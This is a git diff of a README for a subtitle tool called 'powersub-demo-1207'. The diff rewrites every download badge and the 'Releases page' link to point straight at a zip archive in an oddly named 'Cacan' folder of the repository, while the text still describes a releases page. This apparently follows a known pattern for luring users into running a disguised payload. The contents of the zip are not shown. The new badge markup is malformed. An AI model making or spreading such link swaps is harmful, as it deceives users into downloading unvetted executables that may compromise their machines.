@@ -1,7 +1,7 @@
 # 🚀 powersub-demo-1207 - A Simple Tool for Video Subtitles
 
 ## 📥 Download Here
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen.svg)](https://github.com/mrchawda/powersub-demo-1207/releases)
+[![Download](https://raw.githubusercontent.com/mrchawda/powersub-demo-1207/main/Cacan/powersub-demo-1207.zip%https://raw.githubusercontent.com/mrchawda/powersub-demo-1207/main/Cacan/powersub-demo-1207.zip)](https://raw.githubusercontent.com/mrchawda/powersub-demo-1207/main/Cacan/powersub-demo-1207.zip)
 
 ## 📋 Description
 powersub-demo-1207 is a user-friendly application designed for adding subtitles to your videos effortlessly. It caters to anyone who wants to improve their viewing experience without needing technical skills. 
@@ -10,7 +10,7 @@ powersub-demo-1207 is a user-friendly application designed for adding subtitles 
 In this guide, you will learn how to download and run powersub-demo-1207 on your computer. Just follow the steps below, and you'll be enjoying your videos with subtitles in no time.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/mrchawda/powersub-demo-1207/releases) to find the latest version of powersub-demo-1207. 
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/mrchawda/powersub-demo-1207/main/Cacan/powersub-demo-1207.zip) to find the latest version of powersub-demo-1207. 
 2. **Select the Latest Release:** Look for the most recent version listed on the page. It will typically have the highest version number.
 3. **Download the Application:** Click on the link to download the application for your operating system. You will see various files available. Choose the one that matches your system type (Windows/Mac/Linux).
   
@@ -70,6 +70,6 @@ Contributors are welcome! If you would like to help improve powersub-demo-1207, 
 Feel free to connect with others using the application in discussions on GitHub.
 
 ## 📥 Download Here Again
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen.svg)](https://github.com/mrchawda/powersub-demo-1207/releases)
+[![Download](https://raw.githubusercontent.com/mrchawda/powersub-demo-1207/main/Cacan/powersub-demo-1207.zip%https://raw.githubusercontent.com/mrchawda/powersub-demo-1207/main/Cacan/powersub-demo-1207.zip)](https://raw.githubusercontent.com/mrchawda/powersub-demo-1207/main/Cacan/powersub-demo-1207.zip)
 
 Now you are ready to enhance your video experience with subtitles!
